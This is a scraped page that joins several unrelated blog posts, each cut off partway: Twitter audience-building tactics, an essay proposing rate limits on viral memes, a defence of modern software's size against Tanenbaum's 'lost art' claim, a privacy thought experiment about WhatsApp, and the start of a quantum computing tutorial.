<p>I’ve been writing articles, a newsletter, and recording a podcast every week since I started using Twitter. Every week, I post a link to each of these pieces of content on the day they are released.</p>



<p>I learned that linking to the content is the most important thing, but linking to a location where people can find more is equally as important. Whenever I link to a newsletter episode — which I publish on my blog as a static page as well as the original email that is being sent out, I add a reply tweet that links to the newsletter signup page. When I share a blog article, I link to the newsletter in a follow-up tweet as well. Giving people the option to learn more or sign up with just one click has generated a good amount of traffic.</p>



<p>Threads are very useful, too. They allow me to share the key points of the articles I write as some form of a teaser. I start with a tweet that introduces the theme of the article and includes the link. Follow-up tweets in the thread go into detail and raise interesting questions that I answer in the piece. Finally, a tweet with the article’s link ends the tweet: one thread, two identical links.</p>



<p>I also take a day every few weeks to write some standalone tweets. Those often contain quotes from my book, articles, or things I have jotted down in my notes over the weeks. Whenever I talk about a topic that I have written about before, I create a thread that has a link to either my book or my blog where readers can find more information.</p>



<p>I don’t care much for the number of likes or retweets of my shared content. I care about engagement. Whenever someone replies to my tweets, I make sure to like their reply and give them a meaningful response. It’s often just an expression of gratitude, but every now and then, someone asks a question, and I get to reply to it. That is what I care about. Stating a conversation — and then having it. This allows me to be consistent. It shows my followers that I am worth engaging because I actually respond. I see people sharing my Tweets more and more because of this.</p>



<h3>Sharing</h3>



<p>Most of what I share is automated. For that, I use Hypefury, a Twitter scheduling app. Whenever I write a Tweet draft, I put it into Hypefury as quickly as I can. There, I can set an automatic follow-up Tweet that gets added once a few likes have trickled in. The tool also automatically retweets my Tweet 6 hours after I post it.</p>



<p>That brings me to an important point. I live in Berlin, and my main audience is North-American founders. When my day starts here around 9 am, it’s somewhere between midnight, and 3 am in the US. Not a good time to tweet. My second-biggest audience, however, is India. It’s already 01:30 pm there at that point. And that’s a good time to tweet. That’s why the 6-hour retweet delay is so powerful. The people who are already awake and working get the original tweet. The people from other time zones get the retweet once they open Twitter.</p>



<p>Scheduling is key for me. I don’t need to be in front of Twitter to post a Tweet. I can organize this ahead of time. In fact, over Christmas in 2020, I had over 40 items queued up in my Hypefury queue so I could spend Christmas with Danielle and still create interesting Tweets and share interesting links for the people who might not celebrate this holiday. Consistency is key.</p>



<p>Whenever I find an interesting Tweet that I want to share, I make a choice. Instant retweet or queueing it up. For conversations that are ongoing or time-sensitive, I usually retweet right there and then. For timeless things, I find the next slot in Hypefury and queue it in there. This might mean that the Tweet won’t be retweeted for a few days, as I only have ten-ish slots in a day. That’s fine, though, and it allows me to load up on content for days when I know I’ll be busy.</p>



<p>That’s the power of automation. It creates certainty, opportunity and allows for an organized approach to this communication channel.</p>



<h3>Following</h3>



<p>Let me share a little tactic that I have used to find quality followers. I regularly use the&nbsp;<a href="https://sparktoro.com/fake-followers/arvidkahl">SparkToro Fake Followers checking tool</a>&nbsp;to get some insight into my followers’ quality. Right now, it’s quite high, and I want it to stay like that. Followers who are actually interested in what I say and who share my Tweets are what I am looking for.</p>



<p>I usually get those by following people who like replies to my Tweets. I tweet, someone replies, and their followers react. This implies some sort of transitive connection, which seems to increase the likelihood that those people follow me back.</p>



<p>When I follow someone, I make sure that their bio checks out. If they have a description that shows that they’re interesting, a non-default avatar picture, and at least a handful of followers, I am quite likely to follow them. When they are particularly new accounts, I make sure they’re not bots. But that’s it. I can always unfollow them if they act weird in the future.</p>



<p>I follow those who engage with me. It’s pretty simple. You shout me out on Twitter, I follow you. You link to my book, I follow you. You say something that I find interesting and insightful, I follow you. This approach has served me well, and a lot of interesting conversations and learnings have come from that.</p>



<p>I have yet to dive into Twitter lists as a concept of following people. I follow a few but haven’t really done much about this myself. That’s something I want to tackle in the future.</p>



<p>Let’s talk about dealing with platform risk. I’ve seen too many Twitter accounts being banned for numerous reasons, losing all their followers in one swoop. No matter the reason, this risk very real: Twitter owns the platform, they own the profiles, they own the connections. They are, and they own the network.</p>



<p>For that reason, I am glad I have the newsletter. The many thousand subscribers on that list will always be accessible to me, no matter what happens to my Twitter account. I recommend attempting to diversify like this early on. Twitter probably won’t implode as MySpace did, but there is …</p></div></div>

        <blockquote>
  <p><strong>Exponential Process: A process where the rate of increase itself increases with time.</strong></p>
</blockquote>

<p>In 1798, the Reverend Thomas Malthus published his most famous text: An Essay on the Principle of Population. In it, he argued that while food supplies grow linearly, population grows exponentially, and consequently in the near future, population growth would outpace food supplies, leading to massive famine and death. Fortunately, less than 50 years later, the discovery and exploitation of South Pacific islands rich in bird guano, a potent fertilizer, facilitated a dramatic increase in the efficiency of farming. A few decades later, the commercialization of the Haber-Bosch process for the fixation of atmospheric nitrogen finally eliminated the possibility of Malthus’ dire predictions coming true, at least for the foreseeable future.</p>

<p>Yet Malthus’ commentary on the dangers of exponential growth rings true today, perhaps more than at any time in history. One need look no further than the COVID-19 pandemic for evidence of how much damage an exponential process can inflict. This is not to say that all exponential processes are dangerous; compound interest is essential to the structure of the modern financial system. Rather, the lesson we learn from Malthus is that exponential processes must be carefully managed. The sudden availability of cheap fertilizer was a lucky break, and not one we should expect to happen again.</p>

<p>On March 9th, 2020, the Dow Jones Industrial Average had its largest single day percentage drop since 1987. Fears of the economic effects of the growing COVID-19 epidemic triggered a nearly 8 percent drop. But it could have been much, much worse. Just moments after the opening bell, as the Dow fell through 7%, the NYSE’s automated systems tripped what’s known as a “circuit breaker”, halting all trading for 15 minutes.</p>

<p>These trading curbs, as they’re officially known, were implemented by the NYSE following a similar crash in 1987, in order to give traders, and trading systems, time to pause and reconsider what in many respects is a runaway exponential process. As the price drops, more people start selling stocks, triggering a further drop in price. On March 9th, the circuit breaker did its job. The market stabilized, and while the loss was still massive, the momentum of the initial sell off was stopped.</p>

<p>At the same time as the chaos of the COVID-19 was ravaging Wall Street, an equally pernicious pandemic was sweeping across the Internet, this one memetic, rather than biological. As originally conceived, and as used here, a meme is much like a virus; a piece of information that is “contagious” between people. Memes are often associated with lighthearted content, like pictures of kittens and babies, but the same motivation and infrastructure that allows this content to spread is equally effective at transporting much more dangerous ideas. In the last week, we’ve seen the pernicious damage an uncontrolled meme can inflict, both physically and mentally, on a society.</p>

<p>But as dangerous and powerful as exponential processes are, they all have an intrinsic weakness: lower their reproduction rate below 1, and instead of exploding, they collapse. In the case of a viral pandemic like COVID-19 this is achieved by mandating mask wearing, and encouraging social distancing. As an exponential process, the “infodemic” raging across the internet can be managed analogously.</p>

<p>The beginnings of a response have already begun to take shape. Voices spreading disinformation have been deplatformed by major social media companies, and at least one website blamed for inciting violence has been banned by major cloud providers. But this is not sufficient. The same way that the US travel bans against Brazil, Europe and China at the beginning of the pandemic only delayed the inevitable, the surgical strikes against the major sources of disinformation will not hold back the tide.</p>

<p>One solution is more moderation. Major social media services already employ thousands of contractors to sort through often graphic and disturbing content, to determine what can stay, and what has to go. However, this is expensive, even for multi-billion dollar corporations, and as it becomes necessary to avoid public backlash, is a form of regulatory capture. The expansion of manual moderation will become increasingly expensive, and alarmingly, freeze out new entrants who don’t have the capital to comply with implicit or explicit moderation requirements.</p>

<p>If we apply what we know about exponential processes, a simple solution presents itself: limit the reproduction rate of memes. This can be expressed as a simple requirement:</p>

<p><strong>“A meme can be seen by a maximum of 1 basis point (0.01%) of the global population, on a single service, in a 24 hour period.”</strong></p>

<p>Obviously, there’s some room for interpretation (What constitutes “a single service”?) but the spirit of the rule is clear. By limiting the number of views a meme can receive in a single day, we limit the rate at which it can spread. In the same vein as NYSE circuit breakers that give traders time to pause and reevaluate their positions, this rule gives communities time to pause and absorb information before it reaches everyone. This is clearly a tradeoff; viral videos will no longer be able to rack up millions of views in a few hours, but the benefits are manifold.</p>

<p>Lowering the reproduction rate of viral memes gives investigators time to catch up. This could take the form of social media services self-moderating their content, or fact checking their users, as Twitter began doing for some political content over the summer, or it could be journalists and private citizens doing their own fact checks. In either case, an artificially limited reproduction rate gives the truth, which is almost always less scintillating, time to gain ground.</p>

<p>It also has the potential to make social media less addicting. This is bad news for services that rely on a constant stream of eyeballs to generate advertising revenue, but it is almost certainly good for society as a whole, and may incentivise the pursuit of alternative revenue streams better aligned with the collective good.</p>

<p>Critically, implementation of this rule is not onerous, for small startups and established players, alike. This reduces the likelihood of regulatory capture, and doesn’t create an unfair advantage for large corporations.</p>

<blockquote>
  <p>Falsehood flies, and the Truth comes limping after it.</p>

  <p>&nbsp;&nbsp;- Jonathan Swift, 1710</p>
</blockquote>

<p>Capitalism is fantastic at allowing parties to make efficient decisions when those decisions have immediate monetary consequences. It loses effectiveness when decisions are either hard to quantify, or only have long term ramifications. In my view, the role of government regulation is to map long-term, qualitative costs into the monetary domain of capitalism. A chemical plant dumping toxic effluent into a river has a short-term incentive to dispose of waste as cheaply as possible. Regulations on clean water that impose a fine for this behavior recalibrate the cost/benefit analysis to include the long term environmental and societal cost, and thus allow the process of capitalism to come to the best decision, with all the costs factored in.</p>

<p>Recently, there has been talk of revising Section 230 of the Communications Decency Act of 1996, which provides immunity for websites from being sued or prosecuted over content posted to them by private users.</p>

<p>Slightly less well-known is the provision that provides protection from liability for actions of the website in the course of moderating or removing content. In other words, a service can’t be sued for the act of removing content that its owners have deemed offensive.</p>

<p>It doesn’t seem to be a large leap to condition this immunity on enforcement of a rule such as that proposed above. Imposing a cost on the negative externalities of viral content allows the societal cost to be represented in the common, monetary language of executives and shareholders alike, incentivizing companies to consider social good as part of their strategy.</p>

<p>Regardless of the solution, it’s time to have a discourse about the role that the internet and the information we glean from it plays in our lives, and in the evolution of our society and culture. The deaths of five Americans last Wednesday are testament to the fact that it has never been more important.</p>

<p><i>Spring 2020</i></p>

<p>
Shortly before the end of 2019 I stumbled across an excerpt from "Modern Operating Systems" by Andrew S. Tanenbaum, a well-known Computer Science professor and the original author of the MINIX operating system.
</p>

<p>
In it, he writes that <i>"[MULTICS] was designed to support hundreds of users on a machine only slightly more powerful than an Intel 386 (...) This is not quite as crazy as it sounds, since in those days people knew how to write small, efficient programs, a skill that has subsequently been completely lost."</i>
</p>

<p>
The quote has rattled around in my head since then. It's somewhat tongue-in-cheek, but the sentiment is clear. It wasn't the first time I'd heard something like it, and Tanenbaum isn't the first nor the last to make such a claim - I myself am surely guilty of saying something similar at some point in time. Nevertheless, it stuck with me because it's both factually incorrect and very insulting to a lot of young programmers.
</p>

<p>
In Tanenbaum's defense, I understand where he's coming from. It's an easy mistake to make, common among us grumpy old gits. Looking at modern software munching memory and disk space by the gigabyte, it's easy to reminisce about simpler times when 640 or even 64 kilobytes of RAM were enough for everyone.
</p>

<p>
It's also a very common misconception. The sentiment is just as applicable to trades other than programming and likely crops up everywhere with some regularity. Any craft that has developed over time, be it software development, cooking, tailoring, fishing or masonry, will have a group of elders scoffing at new-fangled shortcuts and technological advancements. Such modern folly is made out to be something that sullies the inherent soul of the workmanship and lessens its value. The fact that new skills might have to be learned to master this new technology is seldom taken into account when making such statements.
</p>

<p>
I'm certainly not advocating progress simply for the sake of progress. Doing so often leads to confusing the two very different concepts of <i>change</i> and <i>improvement</i>, a distinction sadly apparent to some only after it has been demonstrated empirically. It's also always good with a bit of historical knowledge, if nothing else because it's humbling to learn about the giants upon whose shoulders we stand.
</p>

<p>
The desire for faster computers with more memory, however, is a desire for real improvement. It means that not only can we do more of the same with our machines, but also new things that seemed impossible mere decades ago. This is important, because herein lies the core of my reasoning.
</p>

<h3>Elder Usability</h3>

<p>
Today, computers are ubiquitous. Not just as laptops or desktops in homes and offices, but as tablets, smartphones, wristwatches and entertainment centers. In fact, pretty much anything except food can be bought in some computerized form today: vacuum cleaners, light bulbs, mirrors, books, cars - even doorbells. We are at a point where we can have computers do our bidding by speaking to them in everyday phrases and be reasonably well understood.
</p>

<p>
At the time when MULTICS was conceptually conceived, a computer was, with few exceptions, a great big machine that easily filled a large room. One that had the performance of a 386 chip was truly top of the line, cutting edge stuff. In fact it was so advanced and expensive that MULTICS itself was accused of being a resource hog, which was one of the reasons it never became very popular.
</p>

<p>
The methods used to get an ancient mainframe like that to perform computations were, put simply, extremely crude. Complex program code had to be written in clunky languages like FORTRAN, stored on massive amounts of punched paper cards and mechanically read into the computer's small and expensive memory. If one was lucky and the program ran without bugs, all you could do was to wait. Even relatively simple tasks that a layperson has been able to solve in the blink of an eye using a spreadsheet program for the last few decades, could take minutes or even hours to carry out - after the computer had been prepped and the program loaded, of course.
</p>

<p>
That doesn't mean the layperson with the spreadsheet program is a skilled programmer, but it also doesn't mean there are no skilled programmers today. It's simply an example of where increased program complexity also increases the usefulness and usability of a computer. For a layperson to perform such a task without the knowledge of FORTRAN and card punches, such complexity is necessary. This, in turn, increases the overall footprint of software.
</p>

<p>
MULTICS and (perhaps to a greater extent) its more successful spin-off, UNIX, were certainly wonders of software engineering. They did truly provide multi-user, multi-tasking environments for a number of generic applications to run in and they did so on very limited hardware. At the same time, there was nothing about those systems that someone could get to grips with after goofing around with a mouse and GUI for a few hours. Everything was based on cryptic commands you had to learn by heart, controlled with even more cryptic parameters you also had to learn by heart.
</p>

<p>
Once learned, those commands could then be used to start a program. Not that you'd really know if it was even running, because most of the programs made no significant difference on the computer's output. Often they just produced a blank screen or an empty line on an teletype and were as cryptic to operate as the commands for starting them. Even a program for performing simple arithmetic could be confusing to a first time user, who would surely want to write "1 + 2" and press enter for a result, but may have had to learn about stacks and RPN and input "1 2 + p" to carry out a basic integer addition.
</p>

<p>
RPN, Reverse Polish Notation, was a great invention because it reduced memory usage at a time when memory was stupendously expensive - exactly the kind of "small and efficient" code Tanenbaum claims is a lost art. It is also an excellent example of why less small and less efficient programming might produce a more pleasant experience for the end user, who can then focus more on the actual problem at hand than on how to think like the computer used to solve it. Today we expect that even the cheapest of phones come with a program resembling a pocket calculator for performing such calculations, requiring little more prerequisite knowledge than a few grade school math lessons.
</p>

<h3>Pointing and Clicking</h3>

<p>
At the time of MULTICS, using computers meant dealing with crude and complex user interfaces, long execution times and results most often presented with simple text printed on paper. The code was small and efficient because the machines offered programmers no other choice, but that code - as brilliant as it was - resulted in a primitive, time consuming and often frustrating user experience. This was what users expected, even if it meant learning RPN for calculations and at least one complex, declarative programming syntax to format even the simplest of documents.
</p>

<p>
Today, we use graphical interfaces for most things. There are still people, like me, who enjoy the power and flexibility offered by a command line once you've learned how to operate it. For others, such as beginner users or the vast majority of people who simply consider their computer to be any other home appliance, the GUI is much more efficient. There's no need to think like a CPU, to memorize cumbersome commands and keep intricate data structures such as directory trees and concepts like logical operators in your head.
</p>

<p>
The GUI comes as at a cost: These easy to use interfaces add complexity to program code, requiring more memory and faster processors. Even early graphical interfaces required considerable power and, though instantly recognizable by a modern-day user, they lacked both speed, finesse and luxuries such as color. It has been a long, meandering journey to end up where we are today.
</p>

<h3>To type a €uro sign</h3>

<p>
Take something as ostensibly simple as text rendering. It was a big step up in usability when computers moved from DIP switch panels and blinkenlights to interfacing over teletypes: plain text commands could be entered and yielded plain text results. It was all 7-bit ASCII (or an equivalent) of course, not taking up much space and not requiring a lot of computational resources. The teletype dictated what characters most of the software written should be able to handle, keeping things small and efficient.
</p>

<p>
Moving forward a bit, teletypes were replaced by CRT terminals. In the beginning, they merely emulated their mechanical predecessors but software that utilized the fixed width and height of a screen and their faster refresh rate soon materialized. Full screen editors, for example, were a step up for the end users, giving them contextual information about the line they were currently editing by displaying the surrounding lines on screen at all times.
</p>

<p>
Of course, manufacturers wanted to sell their computers and terminals to markets other than English speaking ones, which made 7-bit character space a bit crowded. Adding an extra bit of information doubled the number of characters and, in effect, opened up the central European market in earnest. Things like umlauts, circumflexes and accents are taken for granted today but to handle them, we had to increase memory and bandwidth usage.
</p>

<p>
Asian languages such as Mandarin and Japanese, using complex signs for whole words, and a whole host of other alphabets such as Farsi and Tagalog, eventually led to the creation of Unicode and UTF, in which a single character now may take up many times the space of one in 7-bit ASCII. This adds a lot of complexity in tools written for handling simple text files. It also adds a lot of complexity in displaying such text. At the time when 7-bit ASCII ruled, a terminal had a fixed font embedded in hardware and there were no other choices. If you were lucky, it could display bold text in some fashion, but …</p></div></div>

    </span></p><p><em>This is a thought exercise to help explore what is okay (and what isn't) when it comes to the exchange between personal information and the provision of a personalised service.</em></p><p>Imagine you've moved to a new city and you're in need of a hairdresser to do your hair every other week. Perhaps you try out one or two different ones first, or perhaps you go with a friend's recommendation. Either way, after a short while you've settled on a hair dresser you're happy with. They're professional, they treat you well, they remember your name and you build up a relationship with them over time.</p><p>As you visit this hairdresser more often, they gain more experience with your specific hair type, your preferred hair style and your preferred hair products. Perhaps the hairdresser, knowing that you have particularly thick hair, and remembering that you dislike the way it curls around your ears when it gets too long, ensures a shorter cut in those areas by default. Or, perhaps remembering that you’re most happy when your hair has a bouncy look to it, they introduce you to a specific type of wax that helps you achieve that type of effect.</p><p>There's a direct relationship here between (1) how much the hairdresser knows about you, and remembers about you, and (2) the quality of the service you receive. The more the hairdresser knows about you, the better the service they can provide. It's convenient to you when you don't have to explain what you want every time you visit. It's valuable to you when your hairdresser knows so much about your hair and your preferences that they're able to suggest things to you you didn't even know you wanted. It can also be nice if they remember the names of your children, or if they ask about that issue you were grappling with at work the last time you stopped by.</p><p>Now imagine it’s time for your regular haircut, so you visit your trusted hairdresser. You sit down in the salon chair, as you've been doing every other week and they tell you they'll be "right with you." As you look into the mirror in front of you, you see them in the reflection walking up to the coat hanger where you've hung up your coat. Having arrived at your coat they start to insert their hand into your coat's pockets one by one. For each pocket they extract its contents (your wallet, your mobile phone, your keys <sup id="fnref-1"><a href="#fn-1">1</a></sup>) and examine each carefully, before placing them back. After having made their way through your entire coat, they return to your chair to finally tend to your needs: "So, what will it be today? The usual?"</p><p>In this real-life scenario most people would, at the very least, be astonished but hopefully also a bit angry. You might want to say: "Hey! What are you doing in my coat?" Now imagine their response being "Oh, that's just a new policy we've introduced which helps us improve our service to you. You see," they continue, "as I was examining the items in your coat, I noticed a car key with an Audi logo. One of my friends happens to be an Audi mechanic. I can put you in touch with him, if you're interested, and they can help you if your car ever breaks down. I also made note of the contacts in your phone, and if one of them ever comes in for a haircut, and I'll be sure to give them a special treatment, on the house." <sup id="fnref-2"><a href="#fn-2">2</a></sup></p><p>Would this explanation suffice for you? Would it be sufficient justification for rummaging <sup id="fnref-3"><a href="#fn-3">3</a></sup> through your coat? Would it quench the anger you felt above?</p><p>I would hope that to most people this justification sounds silly, perhaps even patronizing and certainly not an adequate justification for rummaging through your belongings. Whether or not the hairdresser's rummaging improves his service to you doesn't matter.</p><p>The only thing that matters here is that your hairdresser has no business rummaging through your fucking coat <sup id="fnref-4"><a href="#fn-4">4</a></sup>.</p><p>Please remember how this makes you feel. We're going to change some variables in the story and see what happens.</p><p>Let's go back to our imagined scenario. You feel offended that your hairdresser went through your coat and you say: "Hey man, I didn't agree to that!"</p><p>"Oh, I'm sorry" he replies "I didn't mean to offend you. But actually, you did consent to this new policy. You see, there's a sign at the door which says:</p><p><em>‘Anybody that walks through this door consents to their coat being rummaged through for purposes of improving our service to you.'</em></p><p>So by walking through the door, you've actually given your consent." <sup id="fnref-5"><a href="#fn-5">5</a></sup>.</p><p>Let’s ignore, for the sake of brevity, the issue of whether walking through a door could reasonably constitute giving consent. Imagine instead that you don't catch the hairdresser rummaging through your coat, but instead they tell you their assistant will examine all your belongings while you lie back, close your eyes and have your hair washed by them with lavender shampoo.</p><p>Try to notice within yourself: Do you feel less outrage if you're not witnessing the act of someone rummaging through your coat, but you know it's happening? For me it makes it slightly more difficult to "find" the outrage inside of myself. Since I’m not witnessing the act with my own eyes, I need to first imagine it happening before I'm able to perceive any level of outrage. The outrage is still there, but it's become a bit harder to access. It's become a bit more distant if you will.</p><p>Let's continue to change variables. Let's imagine there's no assistant but the hairdresser has installed a high tech camera in the room which, without touching your coat and within a microsecond, is able to scan your coat and analyze all its contents. In doing so, it is able to extract the same information the hairdresser and their assistant were able to do when they were doing it themselves. Imagine this takes place in a split second and it happened as you sat down.</p><p>Do you feel angry about what just happened? Do you feel less outrage than before now that the violation is invisible to you, instantaneous and done through an inanimate object?</p><p>For me, I feel outrage, but it's become less visceral and more intellectual. It's as if I only feel outrage because I’m able to follow a sequence of logical steps to arrive at the conclusion that the outcomes of the camera scan and the physical rummaging are one and the same. That said, without the image of a person with their hands in my coat (imagined or not), it’s more difficult to feel outraged. It’s also harder to feel outraged when the violation is committed by an inanimate object. For one, I'm not sure who to get angry at, and I somehow feel less violated when it's a machine or an algorithm committing the act.</p><p>Now go one step further and imagine it's not even a high-tech camera doing the scanning, but some unknown technology which you cannot see and do not understand. It’s not located anywhere you can point at, it’s just “there” somewhere in the hairdresser’s salon with you as it scans the contents of your jacket.</p><p>Are you able to find any outrage at all this time? </p><p>I can still find it, but it’s even more difficult to find than before. With the camera at least I had something I could focus my anger on (and could potentially smash). Without any identifiable person or object committing these acts, the act itself seems to slowly lose the property of being something one could potentially object to.</p><p>My outrage seems to require at a minimum a crime and a perpetrator. I struggle to find those here. Only by invoking the analog equivalent from before and by imagining an actual person committing these acts do I feel outrage. But equating this last scenario to the analog equivalent feels slightly awkward; an oversimplification. As a result, the outrage doesn’t transfer fully from one scenario to the other.</p><p>By changing the process through which the information was extracted while keeping the outcome (the extracted data) the same, my outrage circuitry has almost entirely been bypassed. This was achieved by making the scenario more abstract, instantaneous, invisible and by making the actor an inanimate, unidentifiable piece of technology.</p><p>Now, one final step. Imagine we hadn't started with the analog example of the rummaging hairdresser and the emotional memory of how that made you feel. Imagine instead we would have started with the invisible, instantaneous, inanimate technology. Would you have been able to feel any outrage? Any whatsoever? Would you naturally think of coming up with an analog equivalent scenario to gauge your outrage?</p><p>You actually don't need to imagine the last example. If you're currently using WhatsApp, you're living inside of it. The hairdresser represents Facebook and the coat rummaging policy represents their new privacy policy, or Facebook's general conduct for that matter. If you don't feel outrage, then perhaps that's because you haven't imagined the analog equivalent of what's happening yet (which isn't always self-evident, that’s what I’ve tried to help you with here) <sup id="fnref-6"><a href="#fn-6">6</a></sup>.</p><p>The key observation to note here is that the outrage that gets triggered inside of you gets modulated by <em>the manner in which</em> your information gets extracted, not so much <em>if</em> it gets extracted. It's as if robbing someone of $100 would somehow be less outrageous if you did it through the internet rather than snatching it directly from their wallet.</p><p>In a high-tech society, where we’re surrounded by technological abstractions upon abstractions, should we only be relying on our instinctual outrage circuits to be our moral compasses when they can so easily be fooled?</p><p><em>Even though the hairdresser in this story (Facebook / WhatsApp) is rummaging through your coat, there are many reputable hairdressers (messaging services) that do not. My favourite alternative is <a href="https://signal.org/">Signal</a> <sup id="fnref-7"><a href="#fn-7">7</a></sup>, but I've heard good things about <a href="https://threema.ch/">Threema</a> and although I don't get the impression the technology is accessible enough to port my friends and family, I'm supportive of what <a href="https://matrix.org/">Matrix</a> is trying to accomplish.</em></p></div></article></div>]]>

            <p><a href="https://medium.com/@lduck11007/operating-systems-development-for-dummies-3d4d786e8ac">Read this article on Medium.</a></p><blockquote>“I think I can safely say that nobody understands quantum mechanics” — Richard Feynman</blockquote><p><strong>Q</strong>uantum Computing has always been an enticing topic amongst tech writers and journalists. Its promises to the world of computing — and its difficulty — have enabled the area of research to gain an almost mystical reputation. All too often, articles and infographics surrounding the subject give high praise to its apparent potential while skimming over how such a system works in practice. This tends to misinform all but the most avid of readers.</p><figure><img src="https://whiteheadsoftware.dev/content/images/2020/03/1-BfFBSxoevoTlFL2u6-A4cg.png" alt=""></figure><p>Pop-science explanations will commonly skip over the intricacies of quantum systems, with statements such as:</p><blockquote>While a traditional bit can be a ‘1’ or ‘0’, a quantum bit can be both a ‘1’ and ‘0’ at the same time.</blockquote><p>Or, if you’re more lucky (but still unsure):</p><blockquote>A quantum bit exists in a superposition of ‘1’ and ‘0’.</blockquote><p>The reason that none of these explanations seem to ring true is that we are trying model quantum phenomena in a language that was developed in a very classical world. To explain quantum computing adequately, we need to adopt a new language, the language of mathematics.</p><p>In this guide, I will introduce the mathematics needed to model and understand quantum computing systems, how to represent and run quantum logic and demonstrate an example of a quantum algorithm, and show how it outperforms a traditional computer.</p><hr><p>I’ll try to explain the topics to the best of my ability, but it would help for anyone reading this to understand the basics of linear algebra and digital logic. (You can learn about linear algebra <a href="https://www.khanacademy.org/math/linear-algebra" rel="noopener nofollow">here</a>, and digital logic <a href="https://www.tutorialspoint.com/digital_circuits/" rel="noopener nofollow">here</a>).</p><p>Lets start with a quick recap of digital logic. Digital logic is based around the manipulation of electricity in circuits to make calculations. For the sake of abstraction, we simplify the state of a wire carrying electricity with a state of ‘1’ or ‘0’, representing ‘on’ or ‘off’. By arranging transistors in specific patterns, we can create ‘Logic gates’, which take one or more inputs, and produce an output depending on a specific set of boolean logic.</p><figure><img src="https://whiteheadsoftware.dev/content/images/2020/03/1-z6GnJwe-A8qjFbWyKWM-Pw.png" alt=""></figure><p>By chaining these basic gates together, we can create more complicated gates, and by chaining more complicated gates together, we can eventually end up with a CPU through enough abstraction.</p><p>As stated previously, we’re going to need a way of representing digital logic mathematically, and we’ll start by describing traditional logic as such. With linear algebra, you can represent the classical bits ‘1’ and ‘0’ as 2x1 column vectors as such:</p><figure><img src="https://whiteheadsoftware.dev/content/images/2020/03/1-P0uVBPAgs0vQH9quR5OvOg.png" alt=""></figure><p>With the figure on the left being the <a href="https://en.wikipedia.org/wiki/Bra%E2%80%93ket_notation" rel="noopener nofollow">dirac notation</a> of the vector. By representing our bits as such, we can model logical operations on a bit by using vector transformations. Note that while there are many operations you can do on two bits with logic gates (AND, NOT, XOR etc…), there are only four operations you can do on a single bit: identity, negation, constant 0 and constant 1. Identity leaves the bit unchanged, negation flips the bit (sets 0 to 1 or 1 to 0), and constant-1 and 0 set the bit to 1 or zero regardless of what it was originally.</p><figure><img src="https://whiteheadsoftware.dev/content/images/2020/03/1-TfZMHRKobZWn1ywqA3ejnA.png" alt=""></figure><p>Given our new representation of a bit, you can see that it’s now quite simple to perform operations on this bit by performing vector transformations on it.</p><figure><img src="https://whiteheadsoftware.dev/content/images/2020/03/1-I84pw25xbr8lJQtfNQ9xgg-1.png" alt=""></figure><p>Before moving on, we’ll need to cover a topic known as <a href="https://en.wikipedia.org/wiki/Reversible_computing" rel="noopener nofollow">reversible computing</a>. This simply means that for an operation or logic gate to be reversible, you must be able to determine the set of inputs used, given the output and the name of the operation used. From this, you can probably tell that the Identity and Negation operations are reversible, while the constant-1 and 0 operations are not. Owing to the <a href="https://en.wikipedia.org/wiki/Unitarity_(physics)" rel="noopener nofollow">unitarity</a> property of quantum mechanics, quantum computers only ever use reversible operations, and so we will solely focus on these. Later on, we will be converting non-reversible gates to reversible ones to make them possible to use in a quantum computer.</p><p>You can represent multiple bits at a time by using the <a href="https://www.math3ma.com/blog/the-tensor-product-demystified" rel="noopener nofollow">tensor product</a> of each bit together.</p><figure><img src="https://whiteheadsoftware.dev/content/images/2020/03/1-HhTKwNUzd7DqB4ThJMbJsg.png" alt=""></figure><p>Now that we’ve got most of the maths we need, we’ll introduce our first quantum logic gate. This operator is called a <a href="https://en.wikipedia.org/wiki/Controlled_NOT_gate" rel="noopener nofollow">CNOT</a>, or controlled NOT gate and is very important to reversible and quantum computing. A CNOT gate works on a pair of bits and returns a pair of bits. The first bit is designated the ‘control’ bit, and the other the ‘target’ bit. If the control bit is 1, the target bit is flipped, and if the control bit is 0, the target bit is left unchanged.</p><figure><img src="https://whiteheadsoftware.dev/content/images/2020/03/1-2R5JK_m4lOtSzC1e4lP6jQ.png" alt=""></figure><p>This operator can be represented with the following transformation vector:</p><figure><img src="https://whiteheadsoftware.dev/content/images/2020/03/1-ll9yZtTTvJpNkV4QnvtIWA.png" alt=""></figure><p>To demonstrate what we’ve covered so far, this is how we would use a CNOT gate on multiple bits:</p><figure><img src="https://whiteheadsoftware.dev/content/images/2020/03/1-o8dTegJtetNhQFbT8BZ6DA.png" alt=""></figure><p>To summarise everything up until this point, in the first example we expand |10⟩ into its tensor product, apply the CNOT matrix to get a new resulting product state, then we factor it out to get a result of |11⟩, as we would expect from the CNOT table that was shown before.</p><p>Now that we’ve covered all the maths needed to understand traditional computing and bits, we can start to discuss actual quantum computing and quantum bits.</p><hr><p>If you’ve gotten this far, you’ll be suprised to know that qbits are actually very easy to express mathematically. Essentially, while a cbit (classical bit) is either a |1⟩ or |0⟩, a qbit simply exists in a superposition of both |0⟩ and |1⟩ before it is measured. After it is measured, it collapses to either a |0⟩ or |1⟩. More formally, a qbit is represented as a linear combination of both |0⟩ and |1⟩ with the following definition:</p><figure><img src="https://whiteheadsoftware.dev/content/images/2020/03/1-hqD9PBIUBaFfO1A_FocYXA.png" alt=""></figure><p><em>a₀</em> and <em>a₁ </em>are the amplitudes of |0⟩ and |1⟩ respectively. These can be thought of as “quantum probabilities” that represent the chance that a qbit will collapse into either state when it is measured because in quantum mechanics an object in superposition will collapse into a into a single state when it is observed. We can expand this expression and express it as such:</p><figure><img src="https://whiteheadsoftware.dev/content/images/2020/03/1-9DgjkxPKMa27Xn1Nr1lsSQ.png" alt=""></figure><p>For the sake of simplicity we will be using this notation for the duration of this article.</p><p>For this qbit, when it is measured, its chance of collapsing with a value of <em>a₀</em> is |<em>a</em>₀|², and its chance of collapsing to a value of <em>a</em>₁ is |<em>a</em>₁|². For example, the following qbit:</p><figure><img src="https://whiteheadsoftware.dev/content/images/2020/03/1-v_SODFmcZoINDkknzLKIVw.png" alt=""></figure><p>has a chance of |1/ √2|² , or 1/2 chance of collapsing into a 1, making it a 50/50 chance.</p><p>As the probabilities of a classical system must sum to 1 in order to form a complete probability distribution, it follows that the squares of the absolute values of the amplitudes of |0⟩ and |1⟩ must also add up to 1. From this, we can form the following equation:</p><figure><img src="https://whiteheadsoftware.dev/content/images/2020/03/1-Pej6fvsZtH0iEx0xG28QHg.png" alt=""></figure><figure><img src="https://whiteheadsoftware.dev/content/images/2020/03/1-pO7DYCWGT8OGdLTFGqR4Ew.png" alt=""></figure><p>Logical operators and gates on qbits work exactly the same as with cbits, through matrix transformations. All of the reversible matrix operators 